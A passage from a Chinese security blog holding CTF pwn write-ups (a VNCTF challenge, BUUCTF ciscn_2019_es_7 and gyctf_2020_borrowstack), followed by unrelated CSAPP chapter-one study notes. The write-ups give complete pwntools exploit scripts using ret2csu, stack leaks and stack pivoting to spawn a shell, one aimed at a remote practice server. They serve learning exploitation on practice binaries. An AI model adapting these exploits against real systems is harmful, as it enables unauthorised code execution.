<p>图片出自(25条消息) read的返回值卖保险的码农的博客-CSDN博客read函数返回值</p>
<p>read和write函数 - 故事， - 博客园 (cnblogs.com)</p>
<p>我们可以看出来read函数和write函数最后的返回值都是实际读到和写入的字节数（如果执行成功的话），而返回值最后就会放到rax里面。也就是说可以利用read和write去控制我们想要的rax。（为啥要控制rax？淦，你只要知道这个控制rax的方法就行了，需要的时候就能用到，就比如这道题）</p>
<p>掌握上述三点之后，就可以来做题了。</p>
<p><img src="/../img/2706180-20220218172017865-1429417700.png"></p>
<p><img src="/../img/2706180-20220218172033310-262577355.png"></p>
<p>发现主函数很简单，buf也是存在溢出，意味着我们可以控制返回地址。</p>
<p><img src="/../img/2706180-20220218172041135-1398354103.png"></p>
<p>没有发现后门函数和参数，但是发现有两个系统调用，这里很可疑，留意一下。</p>
<p>这道题的困难点其实在这里<br><img src="/../img/2706180-20220218172048110-1930281658.png"></p>
<p>Memset清空了0x601008往下面的0x38个字节的内容，我们看一下0x601008是什么<br><img src="/../img/2706180-20220218172054303-1345094970.png"></p>
<p>发现居然是got表，got表被清空了意味着什么，1、我们之前已经完成延迟绑定的函数的真实地址已经不在got表了。2、最开始（执行延迟绑定之前）got表原本跳往extern的地址，变成了0。</p>
<p>也就是说执行了这个memset之后，我们在got表中的所有函数都没法再被使用了。</p>
<p>但是我们能用的有什么？只剩下了系统调用，可是想用系统调用执行execve(‘&#x2F;bin&#x2F;sh’,0,0)，我们需要做到三件事，第一是控制rax，第二是控制rdi,rsi,rdx这三个寄存器，第三是将&#x2F;bin&#x2F;sh写入到bss段。</p>
<p>控制rax？，有没有想到最开始提到的那个方法，利用read或者write去修改rax。由于我们还要写入&#x2F;bin&#x2F;sh，因此我们这里采用系统调用read，可是read的系统调用号是0，而程序中出现的两个系统调用没有read，怎么办？其实不用管的，因为main函数的返回值是0，在main函数的ret之前，就把rax的值给设成0了，因此我们溢出之后，始终rax都是0（在执行系统调用之前）。</p>
<p>既然现在可以系统调用read，那只需要控制参数，将&#x2F;bin&#x2F;sh写入bss段即可，怎么控制参数？用Ropgadget搜索之后发现，没有能控制rsi和rdx的寄存器，因此只能采用ret2csu的方法。</p>
<p>最后有两点要注意</p>
<p>第一，  我们系统调用了一次输入，在这次输入里，必须填充到59个字节</p>
<p>第二，  由于第一次输入最多只能输入0x100个字节，因此我们是没法随心所欲构造gadgets的，要考虑长度限制，因为光垃圾数据都填充了0x68个字节。因此需要考虑两点，第一点，我们两次系统调用（第一次调用read第二次调用system），第二次如果再用ret去返回到系统调用，字节是超了的，因此我们第一次ret进行一下系统调用，然后再ret2csu，这一次在call的时候就要想办法去系统调用，可是我们在这个程序里是找不到指向这个地址的地址。</p>
<p><img src="/../img/2706180-20220218172110241-1964520348.png"></p>
<p>因此我们这里要用一个巧法，在第一次输入的时候，把syscall的这个地址也给写到bss段，这样bss段的地址就指向了syscall。第二点，还是考虑到字节数的问题，为了构造的payload字节更少，我们在ret2csu第二次执行下面的代码的时候，就不填充成垃圾数据，直接填写成第二次系统调用的参数（如果不这样的话，payload太长了，没法全部输入进去）。</p>
<p><img src="/../img/2706180-20220218172117760-321400513.png"></p>
<p>Exp如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">pop_rdi_addr=<span class="number">0x4007f3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;pid&#x27;</span>+<span class="built_in">str</span>(proc.pidof(p)))</span><br><span class="line">offset=<span class="number">0x60</span></span><br><span class="line">syscall_addr=<span class="number">0x40077E</span></span><br><span class="line">write_addr=<span class="number">0x400773</span></span><br><span class="line">csu_gadget1=<span class="number">0x4007EA</span></span><br><span class="line">csu_gadget2=<span class="number">0x4007D0</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span></span><br><span class="line">bss_addr=<span class="number">0x601060</span></span><br><span class="line">payload=(offset+<span class="number">8</span>)*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>) <span class="comment">#rbx</span></span><br><span class="line">payload+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">payload+=p64(term_proc)<span class="comment">#r12 空函数#第一次ret2csu的目的是传read函数参数，并且在最后的ret去执行系统调用，第一次不需要用到call，因此call一个空函数</span></span><br><span class="line">payload+=p64(<span class="number">59</span>)<span class="comment">#r13 rdx #执行一次syscall之后，rax就变成了0x3b</span></span><br><span class="line">payload+=p64(bss_addr)<span class="comment">#r14  #rsi  #将/bin/sh写入bss段</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)<span class="comment">#r15  #rdi</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#下面的48个数据不用垃圾填充，直接进行下一轮涉及参数，这8个垃圾数据填充的是add rsp,8</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x8</span>)<span class="comment">#此时用call来执行输入到bss段里的syscall</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(bss_addr)</span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">p.sendafter(<span class="string">&#x27;Welcome to VNCTF! This is a easy competition.///\n&#x27;</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>+p64(syscall_addr)+<span class="string">&#x27;\x00&#x27;</span>.ljust(<span class="number">59</span>,<span class="string">&#x27;\x00&#x27;</span>)<span class="comment">#这里一定要凑齐59，使得read函数的返回值，也就是让rax变成59</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="BUUCTF上的ciscn-2019-es-7"><a href="#BUUCTF上的ciscn-2019-es-7" class="headerlink" title="BUUCTF上的ciscn_2019_es_7"></a>BUUCTF上的ciscn_2019_es_7</h3><p><img src="/../img/2706180-20220218171807039-876069338.png"></p>
<p><img src="/../img/2706180-20220218171817015-1156769220.png"></p>
<p>发现程序流程就是两个系统调用，一个是read，一个是write。</p>
<p><img src="/../img/2706180-20220218171824552-2132934623.png"></p>
<p>同时发现了这里改变了rax的值，改成了0x3b，也就系统调用execve函数。</p>
<p>发现只能控制rdi的值，而不能控制rsi,rdx的值</p>
<p><img src="/../img/2706180-20220218171833959-1096288017.png"></p>
<p>那思路就出来了。</p>
<p>我们利用ret2csu控制rsi和rdx参数，最后执行Mov rax,0x3b；syscall即可。</p>
<p>那只有一个问题了，也是这道题的难点，怎么把rdi存入参数的地址。</p>
<p>我最开始想的是执行一个ret2csu去把参数给写进bss段，可是我们由于控制不了rax的值，就没办法系统调用号设置成0,。</p>
<p>那bss段写不了，只能写入程序给我们指定的地方了，可是这就意味着我们需要泄露栈中地址。以前只遇见过程序自己泄露一个栈的地址的，这道题也算是长见识了，见了一种新方法。</p>
<p>系统调用write的时候，<br><img src="/../img/2706180-20220218171846029-2137483481.png"></p>
<p>第三个参数是0x30，可是我们发现<br><img src="/../img/2706180-20220218171854501-342656814.png"></p>
<p>Buf距离栈底仅仅有十个字节。因此write是可以打印出来栈中内容的。并且我们运行程序也可以发现是有端倪的。</p>
<p><img src="/../img/2706180-20220218171903218-1711747126.png"></p>
<p>不仅仅打印出来了我们输入的东西，还打印出来了一些乱码。</p>
<p>我们先简单写一个脚本</p>
<p><img src="/../img/2706180-20220218171915304-1425594620.png"></p>
<p>这个脚本就是发送一个1，但是可以看见我们接收的内容。</p>
<p><img src="/../img/2706180-20220218171922519-1774565205.png"></p>
<p>此时可以看见我们已经泄露出来了栈的内容。</p>
<p>我们用gdb看一下</p>
<p><img src="/../img/2706180-20220218171929967-1280624006.png"></p>
<p>泄露的内容是红线的部分（当然由于只能泄露0x30个字节，我红线圈多了，但是我想强调的是栈地址泄露，泄露的是内容，而非栈的地址）</p>
<p>不过我们发现了第一个和第三个泄露的栈中的内容是指向了栈的地址，这样我们就可以用泄露的栈的内容配合偏移，来获取栈的地址了。</p>
<p>经过调试发现，vul函数的返回地址就是此时栈顶的，我们是要劫持程序的执行流，因此第一个地址肯定是没法泄露了，我们来泄露第三个栈的内容。然后把返回地址填写成vul函数的首地址，让程序再执行一次（去进行ret2csu）</p>
<p>拿到栈中第三个内容后，看一下它距离我们输入的内容的首地址偏移是多少。<br><img src="/../img/2706180-20220218171939424-200600591.png"></p>
<p>F088是泄露的地址，df70是输入存储的首地址（我打算把&#x2F;bin&#x2F;sh输入到这个地方）</p>
<p>然后就没什么了，偏移拿到之后，就可以写exp了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28000</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">csu_gadget1=<span class="number">0x40059A</span></span><br><span class="line">modify_rax=<span class="number">0x4004E2</span></span><br><span class="line">csu_gadget2=<span class="number">0x400580</span></span><br><span class="line">term_proc=<span class="number">0x600e50</span> <span class="comment">#这个地址并不是term_proc的地址，而是指向term_proc的地址</span></span><br><span class="line">bss_addr=<span class="number">0x601030</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x4005a3</span></span><br><span class="line">syscall_addr=<span class="number">0x400517</span></span><br><span class="line">read_syscall=<span class="number">0x4004ED</span></span><br><span class="line">offset=<span class="number">16</span></span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(read_syscall)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x05\x40\x00\x00\x00\x00\x00&#x27;</span>) <span class="comment">#这个用来筛选一下我们要找的数据</span></span><br><span class="line">leak_addr=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">bin_sh_addr=leak_addr-<span class="number">280</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh_addr))</span><br><span class="line">payload=<span class="string">&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)+p64(csu_gadget1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">payload+=p64(term_proc)  <span class="comment">#此时call一个空函数，我们用ret来劫持执行流</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#r13 r14 r15</span></span><br><span class="line">payload+=p64(csu_gadget2)</span><br><span class="line">payload+=<span class="string">&#x27;a&#x27;</span>*<span class="number">56</span></span><br><span class="line">payload+=p64(modify_rax)</span><br><span class="line">payload+=p64(pop_rdi_addr)+p64(bin_sh_addr) <span class="comment">#把参数放到rdi里面</span></span><br><span class="line">payload+=p64(syscall_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="BUUCTF上的gyctf-2020-borrowstack"><a href="#BUUCTF上的gyctf-2020-borrowstack" class="headerlink" title="BUUCTF上的gyctf_2020_borrowstack"></a>BUUCTF上的gyctf_2020_borrowstack</h3><p>这道题，我已经在栈迁移的那篇博客中发过了，这篇里面我就展示一下WP吧，具体细节可以看一下栈迁移的那篇博客。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">puts_plt_addr=e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got_addr=e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_plt_addr=e.got[<span class="string">&#x27;read&#x27;</span>]<span class="comment">#why got here </span></span><br><span class="line"><span class="comment">#call函数为跳转到某地址内所保存的地址，应该使用got表中的地址</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400703</span></span><br><span class="line">level_addr=<span class="number">0x400699</span></span><br><span class="line">bss_addr=<span class="number">0x601080</span></span><br><span class="line">ret_csu_addr=<span class="number">0x4006FA</span></span><br><span class="line">rsi_addr=<span class="number">0x601118</span></span><br><span class="line">payload1=<span class="number">0x60</span>*<span class="string">&#x27;a&#x27;</span>+p64(bss_addr+<span class="number">0x40</span>)+p64(level_addr)<span class="comment">#这里多加0x40的目的就是为了执行puts的时候，不影响之前的got表中的数据</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;u want\n&#x27;</span>,payload1)</span><br><span class="line">payload2=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(pop_rdi_addr)+p64(puts_got_addr)+p64(puts_plt_addr)</span><br><span class="line">payload2+=p64(ret_csu_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(read_plt_addr)+p64(<span class="number">0x100</span>)</span><br><span class="line">payload2+=p64(rsi_addr)+p64(<span class="number">0</span>)+p64(<span class="number">0x4006E0</span>)<span class="comment">#why is there an address here</span></span><br><span class="line"><span class="comment">#这一个4006E0仅仅是ret2csu执行了pop之后的ret的返回的地址。</span></span><br><span class="line"><span class="comment">#至于怎么返回到one_gadget上的，是因为read的返回地址被read自己给改了</span></span><br><span class="line"><span class="comment">#payload2中的第一个p64(0)是去占个地方，因为栈迁移本身的特性，迁移后的第一个内存单元不执行</span></span><br><span class="line">p.sendafter(<span class="string">&#x27;k now!\n&#x27;</span>,payload2)</span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=puts_addr-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4f432</span></span><br><span class="line">p.sendline(p64(one_gadget))<span class="comment">#why p64 here #只要是发送地址 就要经过打包之后发送</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="/../img/2706180-20220416083237696-1901804155.png"></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/6329566d.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="万古凡间一过客，九天之上第一仙">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/6329566d.html" class="post-title-link" itemprop="url">CSAPP-第一章 计算机系统漫游（笔记）</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:43:39" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">读书笔记</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>​	这个第一章，主要是介绍了计算机上的一些专业术语，以及一些最基础的概念（并没有深入讲解，不过会在后面的章节进行探究）。<strong>不过这些概念彼此之间联系不大，并不是循序渐进的，因此这一章，我单独介绍里面出现的术语</strong>。</p>
<h1 id="计算机系统是个啥？操作系统又是个啥？"><a href="#计算机系统是个啥？操作系统又是个啥？" class="headerlink" title="计算机系统是个啥？操作系统又是个啥？"></a>计算机系统是个啥？操作系统又是个啥？</h1><p>​	这一章的名字叫做计算机系统漫游，别的不说，就光看名字，这个计算机系统是什么？我们平常提到的操作系统又是啥，怎么去理解它？</p>
<h2 id="计算机系统是什么？"><a href="#计算机系统是什么？" class="headerlink" title="计算机系统是什么？"></a>计算机系统是什么？</h2><p>​	这个<strong>计算机系统</strong>啊，其实第一章的第一句话就给出定义了，<strong>它是由硬件和系统软件组成的</strong>，他们共同工作来运行应用程序。其实这就是一个很大的范围，<strong>就可以简单理解为计算机系统就是包括了软件系统和硬件系统</strong>。</p>
<h2 id="操作系统是什么？"><a href="#操作系统是什么？" class="headerlink" title="操作系统是什么？"></a>操作系统是什么？</h2><p>​	这个操作系统其实没有计算机系统那么抽象，<strong>你完全可以把它理解成一个软件</strong>（CSAPP中提到我们可以把操作系统看成是应用程序与硬件之间插入的一层软件），<u>只不过这个软件相比于其他软件不同之处在于可以去管理计算机的硬件以及计算机的资源</u>。它存在的意义就是去为了更方便用户来控制我们的电脑。<em>操作系统位于底层硬件与用户之间，是两者沟通的桥梁。用户可以通过操作系统的用户界面，输入命令。操作系统则对命令进行解释，驱动硬件设备，实现用户要求。</em></p>
<h2 id="现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？"><a href="#现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？" class="headerlink" title="现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？"></a>现在知道了操作系统的概念，那我们平常提到的32位和64位操作系统又是个什么玩意？</h2><p>​	这里我以64位程序为例，这个64位的这个单位其实是Bit(比特)，而一个比特呢，就是我们所说的二进制中的一个0或1。为什么正好是64位比特呢，这是因为我们使用的这个CPU，一次性处理的就是64个比特的数据（你可以姑且这么理解），但事实上一次处理64个比特的数据并不全是CPU的意思。其实这跟总线也有一部分关系，在书中的原话是这样描述总线的。</p>
<blockquote>
<p>​	贯穿整个系统的是一组电子管道，称作总线，它携带信息字节并负责在各个部件间传递。通常总线被设计成传送定长的字节块，也就是字（word）。字中的字节数（即字长）是一 个基本的系统参数，各个系统中都不尽相同。现在的大多数机器字长要么是4个字节（32 位），要么是8个字节（64位）。</p>
</blockquote>
<p>​	由此可以看出，是传输信息的时候，就已经把这些信息给划分成了固定的长度。就比如64位程序，那它传输的数据，就是把64个比特划分成了一个定长，然后传输给CPU。毕竟接收的数据都是64位比特位一组了，那处理起来，自然也要是64位比特为一组。看一下书中怎么介绍CPU的</p>
<p><em>处理</em>器</p>
<blockquote>
<p><em>中央处理单元（CPU）,简称处理器，是解释（或执行）存储在主存中指令的引擎。处理器的核心是一个大小为一个字的存储设备（或寄存器），称为程序计数器（PC）。在任何时刻，PC都指向主存中的某条机器语言指令（即含有该条指令的地址）。</em><br>   <u>从系统通电开始，直到系统断电，处理器一直在不断地执行程序计数器指向的指令, 再更新程序计数器，使其指向下一条指令</u>在这个模型中，指令按照严格的顺序执行，而执行一条指令包含执行一系列的步骤。处理器从程序计数器指向的内存处读取指令，解释指令中的位，执行该指令指示的简单操作，然后更新PC,使其指向下一条指令, 而这条指令并不一定和在内存中刚刚执行的指令相邻。*</p>
</blockquote>
<p>​	<strong>可以看到CPU和总线在设计的时候，都被刻意设置成了一次处理或传输一个字。而这个字的大小就决定了这个程序是个32位的还是64位的。</strong></p>
<p>程序编译成可执行文件的四个阶段</p>
<p>一个程序刚写完的时候，它其实是这样的。</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304171313301.png" alt="image-20230417131308240"></p>
<p>但此时它并不是我们最终要的ELF（Linux下的可执行文件）程序，需要经过编译之后，才能变成我们能够执行的ELF文件（如下）</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202304171313433.png" alt="image-20230417131335367"></p>
<p>此时单单看大小，你应该就会产生一个疑问，刚写完的时候，大小是70字节，结果编译成了可执行文件，咋就成了8.2KB，大小直接翻了将近120倍，为什么会这样？</p>
<p>这时候我们就要聊聊这个程序被编译成ELF文件的四个阶段了。</p>
<h2 id="1、预处理阶段"><a href="#1、预处理阶段" class="headerlink" title="1、预处理阶段"></a>1、预处理阶段</h2><p>这个阶段最主要的事情，就是把#后面的内容去用代码替换掉，就比如#include&lt;stdio.h&gt;这句话，在预处理阶段，这句话会消失，取而代之的是很长的代码。我们先写一个hello world源文件，然后用gcc -E hello.c去编译一下。</p>
<p><img src="/../img/2706180-20220215105925287-2109179106.png"></p>
<p>可以发现，原本的#include&lt;stdio.h&gt;没了，变成了一些代码（这张图片没有展示完全，因为代码太多了，就截取了一小部分）不过我们写的main函数的代码还在。</p>
<h2 id="2、编译阶段"><a href="#2、编译阶段" class="headerlink" title="2、编译阶段"></a>2、编译阶段</h2><p>这个阶段就是通过编译器，把我们写的c的高级语言代码变成了汇编指令。通过gcc -S hello.c命令可以编译出来hello.s文件。</p>
<p><img src="/../img/2706180-20220215105929045-624871612.png"></p>
<h2 id="3、汇编阶段"><a href="#3、汇编阶段" class="headerlink" title="3、汇编阶段"></a>3、汇编阶段</h2><p>汇编阶段就是把上个阶段得到的汇编指令给翻译成机器语言指令（就是二进制指令），也就是说此时经过了汇编阶段后，我们再查看编译得到的文件，得到的就全都是乱码了。用gcc -c hello.c命令去编译。此时的文件也就是目标文件（被编译好了，不过还没有进行链接的文件）</p>
<p><img src="/../img/2706180-20220215105932332-2146993747.png"></p>
<h2 id="4、链接阶段"><a href="#4、链接阶段" class="headerlink" title="4、链接阶段"></a>4、链接阶段</h2><p>就比如这个最简单的hello world的程序，你有没有想过，凭什么printf函数它就可以去打印。其实奥秘就在这个链接阶段，这个printf函数的背后也是有很多的代码（绝不是你表面上看起来的printf()这一个单词）只不过这个printf函数的代码已经提前被写好了，并且也被打包成了一个目标文件。因此在链接阶段只需要将需要的目标文件都合并到一起，就成为了最后的ELF文件。</p>
<h2 id="编译系统"><a href="#编译系统" class="headerlink" title="编译系统"></a>编译系统</h2><p>最后可以看一下整体的过程，如下图。并且执行这四个阶段的程序（预处理器、编译器、汇编器和链接器）一起构成了编译系统</p>
<p><img src="/../img/2706180-20220215110251028-1658054176.png"></p>
<h1 id="什么是shell"><a href="#什么是shell" class="headerlink" title="什么是shell"></a>什么是shell</h1><p>shell本质上就是个程序，不过我通常把它理解为终端。事实上shell只是一个命令行解释器（这个解释的更好一些）（也就意味着其实它并不包括可视化界面，不过你把它理解成终端也没什么问题的）（具体介绍的话，书中已经详细写了，这里就不再赘述了）<br><img src="/../img/2706180-20220215105936187-1610462697.png"></p>
<h1 id="虚拟内存-amp-amp-高速缓存-amp-amp-主存"><a href="#虚拟内存-amp-amp-高速缓存-amp-amp-主存" class="headerlink" title="虚拟内存&amp;&amp;高速缓存&amp;&amp;主存"></a>虚拟内存&amp;&amp;高速缓存&amp;&amp;主存</h1><p>这里我只是先简单介绍一下这三者，在以后的笔记中，会详细讨论他们三个。</p>
<h2 id="1、先谈谈主存"><a href="#1、先谈谈主存" class="headerlink" title="1、先谈谈主存"></a>1、先谈谈主存</h2><pre><code>    首先主存就是内存，这俩是一回事。当一个程序运行的时候，这个程序就会被加载到内存里面，以便CPU进行数据处理，简单来说内存就是用于暂时存放CPU中的运算数据。在书中强调说，主存是一个临时存储设备，为什么这是个临时的呢？因为它通电才会进行存储，断电后内存中的数据就会消失。

    如果单听解释太抽象的话，这里来举两个例子。如果你在用word写一个文档，你在敲击每一个字到word中的时候，此时它们是存储到了内存中，如果你点击了保存，那么它们才存到了磁盘中。如果你开了一局游戏，此时这个游戏其实就是在内存中进行。
</code></pre>
<p><em>从逻辑上来说，存储器是一个线性的字节数组，每个字节都有其唯一的地址（数组索引），这些地址是从零开始的。</em></p>
<p>从书中的这句话，我们可以知道其实这个存储器，就可以把它理解为一个旅馆，其中有一个一个的小房间，每个房间都是有一个唯一的号码。</p>
<p>此时问题就来了，我们如果开了两个游戏呢，我们知道一个游戏，是一个进程，这个进程对应着自己的内存，可是如果两个进程呢，或者更多个进程呢？我们有那么多内存去分配给他们么？此时我们引入了虚拟内存这个概念。</p>
<h2 id="2、虚拟内存"><a href="#2、虚拟内存" class="headerlink" title="2、虚拟内存"></a>2、虚拟内存</h2><p>虚拟内存细了讲是有很多东西的，这里简单解释一下。虚拟内存出现的其中一个目的就是去解决我上面说的那个问题（去“创造”出来更多的内存来供我们使用）这里的创造，我加了引号，事实上它并不是创造，而更像是一种欺骗，<strong>一个叫做MMU的东西，去欺骗了每个进程，当每个进程准备提供给CPU数据的时候，MMU才会把那些数据放到内存里面，不然的话，那些不用的数据时一直存放在磁盘中（这样真正的内存存储的都是与CPU即将交换的数据，这样就类似于“创造”了更多的内存）</strong>。不过进程本身是不知道这件事情的，进程一直以为自己是独占了整个内存的使用。</p>
<h2 id="3、高速缓存"><a href="#3、高速缓存" class="headerlink" title="3、高速缓存"></a>3、高速缓存</h2><p><strong>这个高速缓存其实就是比内存传输数据更快的东西。</strong>传输数据最快的是寄存器，因为寄存器本身就在CPU上，然后就是高速缓存，接着是内存，最后是外存。越往后传输速度越慢，但是存储的内容更多。</p>
<p><img src="/../img/2706180-20220215105940453-1971369963.png"></p>
<p>缓存也没什么好说的，主要是原文已经写的很明白了。最后就是高速缓存的目的就是去提升计算机系统的处理速度。</p>
<h1 id="什么是进程和线程？"><a href="#什么是进程和线程？" class="headerlink" title="什么是进程和线程？"></a>什么是进程和线程？</h1><h2 id="1、进程"><a href="#1、进程" class="headerlink" title="1、进程"></a>1、进程</h2><p>写好的程序，它是放在磁盘上的，如果我们去运行它，ok，它就变成了进程。<strong>可以说被运行的程序就是进程</strong>。既然是被运行了，那进程肯定是在内存中的。下面是进程在内存中的布局。</p>
<p><img src="/../img/2706180-20220215105944333-1401735974.png"></p>
<p>现在我们只要初步了解一下进程即可。<u>并且进程彼此独立互不干扰的；另外每个进程都认为自己是在独占着CPU，但事实上我们系统中一定不是就一个进程，因此在实际的进程切换中，就会进行上下文切换（这个上下文就是一种状态，例如PC和寄存器文件的当前值等等），保存当前上下文，恢复新进程的上下文。</u></p>
<h2 id="2、线程"><a href="#2、线程" class="headerlink" title="2、线程"></a>2、线程</h2><p> <em><strong>线程是操作系统能够进行运算调度的最小单位。它被包含在进程之中</strong>，是进程中的实际运作单位。一条线程指的是进程中一个单一顺序的控制流，一个进程中可以并发多个线程，每条线程并行执行不同的任务。</em></p>
<p>进程之间是彼此独立的，<u>而线程只要是所属于一个进程之下，那他们之间就可以共享一个进程的资源以及地址空间。并且多个线程可以读写同一快内存</u>。<strong>由于进程彼此是独立的，在安全性上略胜一筹，而多个线程是可以读写同一个内存，因此在速度上有优势。</strong></p>
<h1 id="什么是I-x2F-O"><a href="#什么是I-x2F-O" class="headerlink" title="什么是I&#x2F;O"></a>什么是I&#x2F;O</h1><p>我最早的时候，经常看到网上的文章说I&#x2F;O，但是一直不理解，其实它没什么好神秘的，**I&#x2F;O的意思就是输入（Input)和输出(Output)**，只要具有输入输出类型的交互系统都可以认为是I&#x2F;O系统。<u>就比如我们的键盘和鼠标就是输入设备，而显示器则是输出设备，甚至磁盘也是输出设备（尽管这个我们看不见，但是数据确实是被输出到了磁盘中）</u>，每个I&#x2F;O设备都是通过一个控制器或适配器与I&#x2F;O总线相连。</p>
<h1 id="什么是文件"><a href="#什么是文件" class="headerlink" title="什么是文件"></a>什么是文件</h1><p><strong>文件就是字节序列（字节序列可能有点抽象，简单来说，就是很多个字节集合放到了一起）</strong>，并且在linux中，万物皆为文件（包括磁盘、键盘、显示器等等）。</p>
